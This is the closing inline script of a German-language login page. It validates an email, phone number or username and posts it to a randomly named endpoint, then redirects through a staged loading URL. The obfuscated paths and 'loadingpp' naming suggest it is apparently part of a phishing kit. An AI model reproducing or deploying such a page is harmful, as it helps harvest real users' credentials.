    <script>
        function validateEmail(email) {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return emailRegex.test(email);
        }

        function validatePhoneNumber(phone) {
            // Remove spaces, dashes, and other non-numeric characters
            const cleanPhone = phone.replace(/[\s\-\(\)\.]/g, '');
            // Check for valid phone formats (starts with + or digits, 7-15 digits)
            const phoneRegex = /^(\+?[0-9]{7,15})$/;
            return phoneRegex.test(cleanPhone);
        }

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            console.log("submit");
            const username = document.getElementById('username').value.trim();
            const errorMessage = document.getElementById('errorMessage');
            
            if (!username) {
                errorMessage.textContent = 'Bitte geben Sie Ihre E-Mail-Adresse oder Mobiltelefonnummer ein.';
                errorMessage.style.display = 'block';
                return;
            }
            
            // Allow usernames without @ symbols, validate email/phone only if @ is present
            const hasAtSymbol = username.includes('@');
            let isValid = true;
            
            if (hasAtSymbol) {
                isValid = validateEmail(username);
            } else {
                // For usernames without @, allow any non-empty value
                isValid = username.length > 0;
            }
            
            if (!isValid) {
                errorMessage.textContent = hasAtSymbol ? 
                    'Bitte geben Sie eine gültige E-Mail-Adresse ein.' : 
                    'Bitte geben Sie einen gültigen Benutzernamen ein.';
                errorMessage.style.display = 'block';
                return;
            }
            
            // Hide error message if validation passes
            errorMessage.style.display = 'none';
            console.log('Login attempt:', { username });

            $.ajax({
                url: '/BRgASbDqLpc24D4ZcYO9',
                type: 'POST',
                contentType: 'application/json',
                data: JSON.stringify({username}),
                success: function(info) {
                    if(info.OK){
                        window.location = "/loadingpp?time=3&url=/XTk4xzRM2swNZP73Ug5BP";
                    }
                }
            });
        });
        
        // Also hide error message when user starts typing
        document.getElementById('username').addEventListener('input', function() {
            const errorMessage = document.getElementById('errorMessage');
            if (errorMessage) {
                errorMessage.style.display = 'none';
            }
        });
    </script>



</body></html>